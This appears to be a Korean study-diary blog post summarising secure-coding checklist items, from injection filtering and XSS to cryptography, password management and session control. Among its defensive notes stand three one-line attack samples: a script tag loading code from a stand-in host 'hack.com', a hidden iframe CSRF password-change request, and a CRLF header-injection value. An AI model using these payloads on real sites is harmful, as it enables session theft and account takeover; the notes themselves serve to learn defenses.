---
title:  "시큐어코딩"
excerpt: "시큐어코딩"

categories:
  - 66Day
tags:
  - [공부일기, 시큐어코딩]

---
## 시큐어코딩

### (1) 입력값에대한 표현및 검증 항목
> 항상 입력값에 대한 검증 작업은 필수이다
  
#### 1~3. SQL, XML, LDAP 인젝션
- 최소권한, 동적쿼리
- 공통validation, 필터컴포넌트, 인터셉트(MVC), 안전한API
- filter: xml(", [, ], /, =, @) ldap(=, +, <, >, #, ;, \\)

#### 4. 시스템 자원접근 및 명령어 수행
- 경로조작 및 자원삽입, 입력값 조작
- 외부입력값으로 시스템 자원식별 시 비허가자원 사용되어짐 방지, 프로그램내 쉘 생성금지

#### 5. 웹서비스 요청 및 결과검증
- reflective XSS(세션,로그인정보), stored XSS 
- ```<script src="http://hack.com"/>```
- 해결책 : XSS필터링(필터,인터셉터,라이브러리)

#### 6. 웹기반 중요기능요청 및 결과검증
- 인증 및 결제 웹서비스요청
- 세션탈취, XSS악용
- ```<iframe src="changePw.jsp?newPass=123" width="0" height="0"/>```
- 해결책 : CSRF token, 사용자상호인증(captcha), 재인증

#### 7. HTTP 프로토콜검증
> 외부입력값으로 쿠키 및 헤더, 페이지이동URL로 사용하는경우 보안취약점 발생  
- 1)응답분할취약점 2)리다이렉트
- XSS, cache poisoning,\r\n 
- authorName = hacker\r\nHTTP/1.1 200 OK \r\n

#### 8. 허용되지않은 메모리 참조
- 버퍼오버플로우, 포맷스트링삽입
- Non-executable Stack, 랜덤스택(ASLR), 스택가드(StackGuard)

#### 9. 보안기능동작 입력값 검증
- 1)부적절한입력값 2)정수형오버플로우 3) null포인트역참조-에러처리와 관련지어 서술
- 쿠키, 환경변수, 히든필드
- 중요상태정보, 인증, 권한정보는 쿠키아닌 서버에 저장.

#### 10. 업로드/다운로드 파일검증
- 1)위험한파일 업로드 2)경로조작문자 3)무결성검사없는 코드 다운로드
- 웹쉘, DNS스푸핑
___
### (2) 보안기능

#### 1. 인증대상 및 방식
- "인증 후 사용"정책 적용, OTP, 2팩터인증

#### 2. 인증수행제한
- brute force
- 이력로깅 후 추가조치 수행

#### 3. 비밀번호관리
- 관리규칙 - 변경, 만료주기, 최종로그인성공시간
- 취약한복구절차
- 1)암호이용안내서 2)TLS,VPN 3)솔트(원본문자열인식가능성)

#### 4. 중요자원 접근통제
- 1)중요자원 정의 2)최소권한관리
- 중요자원종류 : 중요자원, 중요기능, 관리자페이지
- SSI(server side include), ACL, RBAC(ERD상기)- session, role, permisson, object, operation

#### 5. 암호화 키
- 하드코드, 주석문, 암호이용안내서준수
- 암호화키/저장DB 분리, 부득이한 메모리저장시 0으로 초기화
- 키 생명주기(생성->사용->페기)기준 암호화 키 관리 프로세스

#### 6. 암호화 알고리즘
- 국제표준 또는 검증필 알고리즘, 키길이, 솔트(레인보우테이블)
- 안전한난수생성알고리즘[Math.Random() vs util.Random(), security.securityRandom()]
- FIPS 140-2인증받은 난수생성기, 256비트이상 시드
- 비둘기집의원리
- 해시충돌방지
	- 체이닝, 개방주소(선형조사, 2차원조사, 더블해싱)
	- 선형조사 삭제시 delete 체크

#### 7. 중요정보 저장
> 보안항목>암호연산 요구사항 충족, 안전영역 설정  
- 1)중요정보 평문저장 2)중요정보 세션저장
- 메모리, 자동완성

#### 8. 중요정보 전송
> 보안항목>암호연산 요구사항 충족  
- 스니핑, 세션쿠키
___
### (3) 에러처리
- 1)명시적예외 2)런타임예외
___
### (4) 세션통제
- 종료된 클라이언트정보 삭제(세션쿠키), 로그아웃메뉴(session.invalidate())
- 세션타임, 싱클론 세션데이터 공유 금지
- 세션ID포함쿠키 HttpOnly속성설정

